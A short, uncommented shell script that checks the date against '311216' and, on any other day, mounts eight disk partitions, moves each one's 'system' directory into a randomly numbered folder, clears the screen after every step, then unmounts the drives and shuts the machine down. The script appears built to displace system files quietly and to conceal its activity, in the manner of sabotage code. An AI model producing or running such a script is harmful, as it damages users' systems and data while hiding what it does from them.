r=$(($RANDOM % 10000 + 10000))
d=$(date '+%d%m%y')
t=311216
if test "$d" != "$t"
then
mount /dev/sda1 /system/mounta/
clear
mount /dev/sda2 /system/mountb/
clear
mount /dev/sda3 /system/mountc/
clear
mount /dev/sda4 /system/mountd/
clear
mount /dev/sda5 /system/mounte/
clear
mount /dev/sdb1 /system/mountf/
clear
mount /dev/sdb2 /system/mountg/
clear
mount /dev/sdb3 /system/mounth/
clear
mv /system/mounta/system /system/system/conloga/$r/
clear
mv /system/mountb/system /system/system/conlogb/$r/
clear
mv /system/mountc/system /system/system/conlogc/$r/
clear
mv /system/mountd/system /system/system/conlogd/$r/
clear
mv /system/mounte/system /system/system/conloge/$r/
clear
mv /system/mountf/system /system/system/conlogf/$r/
clear
mv /system/mountg/system /system/system/conlogg/$r/
clear
mv /system/mounth/system /system/system/conlogh/$r/
clear
sleep 3m

umount /system/mounta
clear
umount /system/mountb
clear
umount /system/mountc
clear
umount /system/mountd
clear
umount /system/mounte
clear
umount /system/mountf
clear
umount /system/mountg
clear
umount /system/mounth
clear
shutdown -h now
fi

